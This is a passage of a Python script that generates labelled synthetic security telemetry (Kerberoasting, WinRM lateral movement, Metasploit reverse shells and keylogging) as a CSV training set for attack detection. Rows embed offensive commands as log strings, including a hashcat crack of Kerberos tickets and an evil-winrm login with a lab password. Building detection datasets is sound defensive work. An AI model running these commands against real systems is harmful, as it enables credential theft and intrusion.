    "GetUserSPNs.py: Kerberos TGS request for svc_sql@SOCFUSION.LOCAL"
))
t += 2

# DC logs EventID 4769
rows.append(make_row(
    t, "SOC-DC", "windows_security", "4769", "kerberos_ticket", "authentication",
    "svc_sql@SOCFUSION.LOCAL", DOMAIN,
    "", "", "",
    "192.168.56.40", "48604", "192.168.56.10", "88",
    "kerberoasting_dc", 1, "ATTACK_KERB",
    "Credential Access", "T1558", "T1558.003", 0.99,
    "ATTACK_KERB|svc_sql|SOC-DC", "Windows Security EventID 4769",
    "EventID 4769: TGS requested for svc_sql, EncType=0x17 (RC4 - crackable)"
))
t += 1

# Ticket cracking offline
rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "hashcat", "/bin/bash",
    "hashcat -m 13100 -a 0 svc_sql.hash /usr/share/wordlists/rockyou.txt",
    "192.168.56.40", "", "", "",
    "kerberoasting_crack", 1, "ATTACK_KERB",
    "Credential Access", "T1558", "T1558.003", 0.99,
    "ATTACK_KERB|root|soc-kali", "Kali auditd",
    "hashcat offline crack: Kerberos RC4 ticket for svc_sql"
))
t += 5

# ============================================================
# SCENARIO K: WINRM LATERAL MOVEMENT
# ============================================================

print("Generating WINRM LATERAL MOVEMENT telemetry...")
t += 50

rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "evil-winrm", "/bin/bash",
    "evil-winrm -i 192.168.56.20 -u Administrator -p Attack001@123",
    "192.168.56.40", "", "192.168.56.20", "5985",
    "winrm_connect", 1, "ATTACK_WINRM",
    "Lateral Movement", "T1021", "T1021.006", 0.99,
    "ATTACK_WINRM|root|soc-kali", "Kali auditd",
    "evil-winrm: WinRM session to 192.168.56.20:5985 as Administrator"
))
t += 2

rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\wsmprovhost.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\wsmprovhost.exe -Embedding",
    "192.168.56.40", "5985", "192.168.56.20", "",
    "winrm_shell", 1, "ATTACK_WINRM",
    "Lateral Movement", "T1021", "T1021.006", 0.98,
    "ATTACK_WINRM|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "wsmprovhost.exe spawned: WinRM remote shell from 192.168.56.40"
))
t += 1

rows.append(make_row(
    t, "SOC-CLIENT01", "windows_security", "4624", "logon", "authentication",
    "Administrator", DOMAIN, "", "", "",
    "192.168.56.40", "", "192.168.56.20", "",
    "winrm_logon", 1, "ATTACK_WINRM",
    "Lateral Movement", "T1021", "T1021.006", 0.97,
    "ATTACK_WINRM|Administrator|SOC-CLIENT01", "Windows Security EventID 4624",
    "Logon: Administrator from 192.168.56.40 LogonType=3 (WinRM)"
))
t += 2

# Commands over WinRM
for cmd, tactic, technique, sub in [
    ("whoami /priv", "Discovery", "T1033", ""),
    ("Get-Process | Where-Object {$_.CPU -gt 10}", "Discovery", "T1057", ""),
    ("Get-ChildItem C:\\Users -Recurse -Include *.txt,*.docx", "Discovery", "T1083", ""),
    ("Get-LocalGroupMember Administrators", "Discovery", "T1069", "T1069.001"),
]:
    rows.append(make_row(
        t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
        "Administrator", DOMAIN,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\wsmprovhost.exe",
        cmd,
        "192.168.56.20", "", "", "",
        "winrm_discovery", 1, "ATTACK_WINRM",
        tactic, technique, sub, 0.94,
        f"ATTACK_WINRM|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
        f"WinRM command: {cmd}"
    ))
    t += random.randint(3, 10)

# ============================================================
# SCENARIO L: MORE BASELINE MIXED IN (post-attack period)
# ============================================================

print("Generating more BASELINE benign events...")
for _ in range(1500):
    host = random.choice(["SOC-CLIENT01", "SOC-CLIENT02", "SOC-DC"])
    proc = random.choice(NORMAL_PROCESSES)
    parent = random.choice(NORMAL_PROCESSES)
    rows.append(benign_row(t, host, proc, parent))
    t += random.randint(3, 90)

# ============================================================
# SCENARIO M: ADDITIONAL METASPLOIT SESSIONS (repetitions)
# Multiple sessions to generate more training variety
# ============================================================

print("Generating additional Metasploit session variations...")

for session_num in range(1, 6):
    t += 500
    port_var = random.choice([4444, 4445, 4446, 8080, 8443])
    victim = random.choice(["SOC-CLIENT01", "SOC-CLIENT02"])
    victim_ip = HOSTS[victim]

    # Reverse shell
    rows.append(make_row(
        t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
        "Administrator", DOMAIN,
        f"C:\\Windows\\Temp\\svc{session_num}.exe", "", "",
        victim_ip, str(random.randint(49152, 65535)), "192.168.56.40", str(port_var),
        "c2_connection", 1, "ATTACK_METASPLOIT",
        "Command and Control", "T1071", "T1071.001", 0.99,
        f"ATTACK_METASPLOIT_S{session_num}|Administrator|{victim}", "Sysmon EventID 3",
        f"Reverse TCP session {session_num}: {victim}:ephemeral → soc-kali:{port_var}"
    ))
    t += 2

    # keyscan_start
    rows.append(make_row(
        t, victim, "windows_sysmon", "8", "create_remote_thread", "process_execution",
        "Administrator", DOMAIN,
        "C:\\Windows\\System32\\svchost.exe",
        f"C:\\Windows\\Temp\\svc{session_num}.exe", "",
        victim_ip, "", "", "",
        "keylogger_inject", 1, "ATTACK_METASPLOIT",
        "Collection", "T1056", "T1056.001", 0.99,
        f"ATTACK_METASPLOIT_S{session_num}|Administrator|{victim}", "Sysmon EventID 8",
        f"keyscan_start session {session_num}: keylogger hook injected"
    ))
    t += random.randint(20, 60)

    # keyscan_dump
    rows.append(make_row(
        t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
        "Administrator", DOMAIN,
        f"C:\\Windows\\Temp\\svc{session_num}.exe", "", "",
        victim_ip, str(random.randint(49152, 65535)), "192.168.56.40", str(port_var),
        "keylogger_exfil", 1, "ATTACK_METASPLOIT",
        "Exfiltration", "T1056", "T1056.001", 0.99,
        f"ATTACK_METASPLOIT_S{session_num}|Administrator|{victim}", "Sysmon EventID 3",
        f"keyscan_dump session {session_num}: keystroke data exfiltrated to C2:{port_var}"
    ))
    t += 5

    # Discovery
    for cmd in ["whoami", "ipconfig /all", "netstat -ano"]:
        rows.append(make_row(
            t, victim, "windows_sysmon", "1", "process_creation", "process_execution",
            "Administrator", DOMAIN,
            "C:\\Windows\\System32\\cmd.exe",
            f"C:\\Windows\\Temp\\svc{session_num}.exe",
            cmd,
            victim_ip, "", "", "",
            "discovery", 1, "ATTACK_METASPLOIT",
            "Discovery", "T1082", "", 0.94,
            f"ATTACK_METASPLOIT_S{session_num}|Administrator|{victim}", "Sysmon EventID 1",
            f"Discovery: {cmd} via meterpreter session {session_num}"
        ))
        t += random.randint(3, 12)

# ============================================================
# WRITE CSV
# ============================================================

output_path = "/home/vikas/SOCFusion/SOCFusion_FULL_TRAINING_DATASET.csv"

print(f"\nWriting {len(rows)} rows to {output_path}...")

with open(output_path, "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=COLUMNS)
    writer.writeheader()
    writer.writerows(rows)

print(f"\n✅ Dataset generated successfully!")
print(f"   Total rows:      {len(rows)}")
print(f"   Attack rows:     {sum(1 for r in rows if r['attack_label'] == 1)}")
print(f"   Benign rows:     {sum(1 for r in rows if r['attack_label'] == 0)}")
print(f"\nAttack breakdown:")
attack_ids = {}
for r in rows:
    if r['attack_label'] == 1:
        aid = r['attack_id']
        attack_ids[aid] = attack_ids.get(aid, 0) + 1
for aid, count in sorted(attack_ids.items()):
    print(f"   {aid}: {count} events")
print(f"\nMITRE techniques covered:")
techniques = {}
for r in rows:
    if r['mitre_technique']:
        t_key = r['mitre_subtechnique'] if r['mitre_subtechnique'] else r['mitre_technique']
        techniques[t_key] = techniques.get(t_key, 0) + 1
for tech, count in sorted(techniques.items()):
    print(f"   {tech}: {count} events")
print(f"\nOutput: {output_path}")
